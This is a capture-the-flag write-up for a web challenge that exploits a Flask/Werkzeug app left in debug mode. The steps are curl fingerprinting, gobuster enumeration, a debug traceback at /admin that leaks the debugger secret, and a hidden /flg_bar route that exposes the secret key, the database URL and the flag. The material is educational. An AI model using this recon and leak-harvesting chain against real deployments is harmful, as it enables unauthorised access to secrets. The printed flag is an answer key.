# Debug Desaster — Writeup

- **Category:** Web
- **Target:** `http://23.179.17.92:5002`
- **Flag:** `CIT{H1dd3n_D1r5_3v3rywh3r3}`

## Challenge description

```text
Developing this application is tough, and I needed debug mode to be enabled... but I'm nervous I forgot to turn it off in production. I also think I may have forgot to remove something from the application structure.

http://23.179.17.92:5002
```

## Initial analysis

The description strongly hints at two things:

1. **Debug mode is enabled in production**
   - In Flask/Werkzeug apps, this often means stack traces are exposed.
   - In some cases, the interactive Werkzeug debugger may also be reachable.

2. **Something was left in the application structure**
   - This suggests a forgotten route, backup file, development endpoint, or hidden directory.

Because of those clues, the plan was:

- fingerprint the web server
- enumerate common paths
- intentionally trigger errors
- inspect any debug traceback for leaked internal paths/routes

---

## Step 1: Fingerprint the application

First, inspect the root page and headers.

### Command

```bash
curl -i -sS http://23.179.17.92:5002/ | sed -n '1,140p'
```

### Observation

The response showed Werkzeug in the `Server` header:

```http
Server: Werkzeug/3.1.8 Python/3.11.15
```

This is already a very strong indicator that the application is a Flask/Werkzeug app, which matches the description.

At this point, Flask debug mode became the main attack hypothesis.

---

## Step 2: Check for common debug-related endpoints

A common thing to test with Flask/Werkzeug is whether debugger-related routes are accessible.

### Command

```bash
curl -i -sS http://23.179.17.92:5002/console | sed -n '1,120p'
```

### Observation

`/console` did not directly yield code execution, but it behaved in a way consistent with Werkzeug debugger machinery being present.

That suggested the debugger or traceback interface might be reachable indirectly through an exception page.

---

## Step 3: Enumerate hidden directories/routes

Since the description also hinted that something may have been left in the application structure, directory enumeration was the next natural step.

### Command

```bash
gobuster dir -u http://23.179.17.92:5002 -w /usr/share/wordlists/dirb/common.txt -q -k -t 30
```

I also manually checked interesting results.

### Important discovery

A request to `/admin` returned **HTTP 500** and an exception page.

### Manual probe

```bash
curl -i -sS http://23.179.17.92:5002/admin | sed -n '1,120p'
```

### Observation

Instead of a generic error page, `/admin` returned a **Werkzeug debug exception page**.

This was the key turning point.

The page exposed:

- traceback details
- debug metadata
- a JavaScript debugger interface
- a debugger `SECRET`

This confirmed that **debug mode was exposed in production**.

---

## Step 4: Extract information from the Werkzeug debug page

To inspect the debug page more closely, save it locally and grep for the most useful artifacts.

### Command

```bash
curl -sS http://23.179.17.92:5002/admin > /tmp/admin_dbg.html
grep -Eo 'SECRET = "[^"]+"|/[^"'"'"' ]+|Exception:.*' /tmp/admin_dbg.html | sed -n '1,80p'
```

### Observation

The page leaked the debugger secret:

```text
SECRET = "RT43RRQsA1YUOZQyYp4V"
```

It also included traceback context and internal application details.

The exception title was:

```text
Exception: Debug leak triggered: Dirbuster maybe in your future!
```

This was basically a challenge author hint that directory/route enumeration mattered.

I also fetched the debugger JavaScript to confirm it was a real Werkzeug debugger page.

### Command

```bash
curl -sS 'http://23.179.17.92:5002/admin?__debugger__=yes&cmd=resource&f=debugger.js' | sed -n '1,120p'
```

### Observation

The returned script included standard Werkzeug debugger code such as:

```javascript
docReady(() => {
  if (!EVALEX_TRUSTED) {
    initPinBox();
  }
```

This confirmed that the exposed error page was indeed the real Werkzeug debugger interface.

---

## Step 5: Use the traceback leak to identify a forgotten route

The important part of the traceback was not just that debug mode was on, but that it leaked **internal application structure**.

From the traceback data, a hidden route name was revealed:

```text
/flg_bar
```

This perfectly matched the second hint in the description:

> “I also think I may have forgot to remove something from the application structure.”

So instead of spending more time trying to fully unlock the interactive console via PIN bypass/reconstruction, the faster path was to directly visit the leaked route.

---

## Step 6: Request the leaked hidden route

### Command

```bash
curl -i -sS http://23.179.17.92:5002/flg_bar | sed -n '1,120p'
```

### Response

```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.11.15
Content-Type: text/plain

SECRET_KEY=supersecret
FLAG=CIT{H1dd3n_D1r5_3v3rywh3r3}
DATABASE_URL=sqlite:///prod.db
```

### Observation

The hidden route directly exposed sensitive development information, including:

- `SECRET_KEY=supersecret`
- `DATABASE_URL=sqlite:///prod.db`
- and most importantly the flag:

```text
CIT{H1dd3n_D1r5_3v3rywh3r3}
```

---

## Why this worked

This challenge combined two classic web mistakes:

### 1. Flask/Werkzeug debug mode exposed in production

This leaked:

- stack traces
- debugger metadata
- internal application details
- hidden route names through traceback content

### 2. A forgotten development/debug route remained deployed

The route `/flg_bar` should never have been publicly accessible. Because debug output exposed internal structure, it became easy to find and access.

So the exploit chain was:

1. identify Flask/Werkzeug
2. find a route that throws an exception (`/admin`)
3. inspect the debug traceback
4. recover a hidden endpoint name from leaked internals
5. request that hidden endpoint
6. read the flag

---

## Minimal solve path

If you want the shortest reproduction:

```bash
curl -sS http://23.179.17.92:5002/admin > /tmp/admin.html
grep -o '/flg_bar' /tmp/admin.html
curl -sS http://23.179.17.92:5002/flg_bar
```

Expected final output:

```text
SECRET_KEY=supersecret
FLAG=CIT{H1dd3n_D1r5_3v3rywh3r3}
DATABASE_URL=sqlite:///prod.db
```

---

## Final flag

```text
CIT{H1dd3n_D1r5_3v3rywh3r3}
```
